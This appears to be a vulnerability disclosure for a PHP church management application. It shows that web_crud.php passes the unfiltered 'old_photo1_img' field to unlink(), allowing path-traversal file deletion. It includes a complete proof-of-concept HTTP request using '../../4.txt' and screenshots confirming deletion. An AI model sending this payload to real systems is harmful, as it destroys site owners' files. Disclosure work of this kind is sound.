### Vulnerability file address

In line 163 of `church/admin/app/web_crud.php`, `@unlink("../../assets/images/" . $_POST['old_photo1_img']);`,` $_POST['old_photo1_img']` parameters have not been restricted, which causes any file to be deleted

```php
if (isset($_POST['update2'])) {
        function generateUniqueFilename($file)
        {
            $file_extension = pathinfo($file['name'], PATHINFO_EXTENSION);
            $unique_filename = uniqid() . '.' . $file_extension;
            return $unique_filename;
        }

        if ($_FILES['photo1']['tmp_name'] != '') {
            $img = generateUniqueFilename($_FILES['photo1']);
            $filepath = "../../assets/images/" . $img;

            if (move_uploaded_file($_FILES["photo1"]["tmp_name"], $filepath)) {
                @unlink("../../assets/images/" . $_POST['old_photo1_img']);
            }
```

### POC

```http
POST /church/admin/app/web_crud.php HTTP/1.1
Host: www.church.net
Connection: close
Cookie: PHPSESSID=hl5noegsdjn1ru7skoi8tmqco3
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Length: 373

------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="update2"

1
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="old_photo1_img"

../../4.txt
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="photo1";filename="aaa.php"

this is test
------WebKitFormBoundaryTZGvWJmfBtMK9O8p--
```

### Attack results pictures

First, we create a `4.txt` file in the `church/` directory

![image-20250504210310906](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505042103944.png)

Then we execute the above poc to attack

![image-20250504210335161](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505042103190.png)

Files are deleted after the attack is successful

![image-20250504210323699](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505042103730.png)